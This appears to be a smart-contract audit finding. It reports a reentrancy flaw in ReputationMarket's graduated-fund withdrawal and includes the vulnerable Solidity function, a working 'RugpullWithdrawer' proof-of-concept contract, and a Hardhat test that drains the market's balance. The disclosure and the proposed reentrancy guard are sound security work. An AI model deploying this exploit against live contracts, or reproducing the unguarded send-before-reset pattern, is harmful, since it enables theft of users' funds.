# Graduate withdrawer can drain all market funds

### Summary

The Graduate withdrawer can execute reentrancy attack to drain all market funds

### Root Cause

- The [function `ReputationMarket::withdrawGraduatedMarketFunds()`](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/main/ethos/packages/contracts/contracts/ReputationMarket.sol#L660-L678) allows the graduator to withdraw funds from graduated markets. However, the function does not have reentrancy protection, which can allow the graduator to reenter the function to drain all markets funds.
```solidity
  function withdrawGraduatedMarketFunds(uint256 profileId) public whenNotPaused {
    address authorizedAddress = contractAddressManager.getContractAddressForName(
      "GRADUATION_WITHDRAWAL"
    );
    if (msg.sender != authorizedAddress) {
      revert UnauthorizedWithdrawal();
    }
    _checkMarketExists(profileId);
    if (!graduatedMarkets[profileId]) {
      revert MarketNotGraduated();
    }
    if (marketFunds[profileId] == 0) {
      revert InsufficientFunds();
    }

@>    _sendEth(marketFunds[profileId]);
    emit MarketFundsWithdrawn(profileId, msg.sender, marketFunds[profileId]);
@>    marketFunds[profileId] = 0;
  }
```

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. A malicious contract is set as Graduate withdrawal role
2. Graduate withdrawal role calls `graduateMarket()`
3. Graduate withdrawal role calls `withdrawGraduatedMarketFunds()`, triggers reentrancy attack to drain funds

### Impact

- Market funds can be drained all (rugpull)

### PoC

Example with a simple contract `RugpullWithdrawer` as below:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "../ReputationMarket.sol";

contract RugpullWithdrawer {
    ReputationMarket market;

    bool reentered;
    uint256 cachedProfileId;

    constructor(address _market) {
        market = ReputationMarket(_market);
    }

    function rug(uint256 profileId) public {
        cachedProfileId = profileId;
        market.withdrawGraduatedMarketFunds(profileId);
    }

    fallback() external payable {
        if (!reentered) {
            reentered = true;
            rug(cachedProfileId);
        }
    }
}

```

Add the test below to test file `test/reputationMarket/rep.graduate.test.ts`, under the `describe('Graduated Market Fund Withdrawal'`

```js
  describe('Graduated Market Fund Withdrawal', () => {
   ...
    it.only('reentrancy', async () => {
      const initialBalance = await ethers.provider.getBalance(graduator.address);
      // first market's funds
      const funds = await reputationMarket.marketFunds(DEFAULT.profileId);
      
      // create a new market with the same funds
      await reputationMarket
      .connect(deployer.ADMIN)
      .createMarketWithConfigAdmin(ethosUserB.signer.address, 0, {
        value: DEFAULT.initialLiquidity,
      });

      await userA.buyVotes({ buyAmount: ethers.parseEther('0.1'), profileId: ethosUserB.profileId });
      await userB.buyVotes({ buyAmount: ethers.parseEther('0.1'), profileId: ethosUserB.profileId });

      let rugpullContractFactory = await ethers.getContractFactory("RugpullWithdrawer");
      let rugpullContract = await rugpullContractFactory.deploy(await reputationMarket.getAddress());

      await deployer.contractAddressManager.contract
      .connect(deployer.OWNER)
      .updateContractAddressesForNames([await rugpullContract.getAddress()], ['GRADUATION_WITHDRAWAL']);


      let balanceBefore = await ethers.provider.getBalance(await reputationMarket.getAddress())

      await rugpullContract.rug(DEFAULT.profileId);

      let balanceAfter= await ethers.provider.getBalance(await reputationMarket.getAddress())

      expect(balanceBefore).to.be.eq(funds * 2n);
      expect(balanceAfter).to.be.eq(0n);
    });
}
```

Run the test and console shows:
```bash
  ReputationMarket Graduation
    Graduated Market Fund Withdrawal
      âœ” reentrancy (119ms)
```

### Mitigation

Add reentrancy guard
